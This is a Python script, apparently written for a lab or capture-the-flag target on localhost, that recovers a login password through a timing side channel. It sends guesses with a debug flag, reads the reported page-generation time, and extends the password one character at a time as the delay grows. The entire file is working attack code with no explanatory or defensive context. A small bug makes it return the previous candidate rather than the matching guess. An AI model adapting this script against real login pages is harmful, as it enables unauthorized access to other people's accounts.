import requests
import string
import re

LOGIN_URL = "http://127.0.0.1/auth/login"
DELAY_STEP = 150


def do_password_attempt(password: str):
    """Returns ms to page generation, if -1 is generated = password is correct"""
    r = requests.post(LOGIN_URL, {"debug": True, "password": password})
    
    if r.url != LOGIN_URL:
        print(f"{password} => Success!")
        return -1
    
    delay = int(re.findall("Page generated in (\d+) ms.", r.text)[0])
    print(f"{password} => {delay}")

    return delay


def guess_first_character_and_length():
    for length in range(1, 12): # Max length of password field is 11
        for c in string.ascii_lowercase:
            if do_password_attempt(c * length) == DELAY_STEP * 2:
                return c, length


def guess_password(first_char, password_length):
    delay = DELAY_STEP * 2
    password = first_char * password_length

    for i in range(1, password_length):
        for c in string.ascii_letters:
            password_guess = password[:i] + c + password[i+1:]
            delay_guess = do_password_attempt(password_guess)

            if delay_guess == -1:
                return password
            elif delay_guess > delay:
                password = password_guess
                delay = delay_guess
                break


def main():
    first_char, password_length = guess_first_character_and_length()
    guess_password(first_char, password_length)


if __name__ == "__main__":
    main()
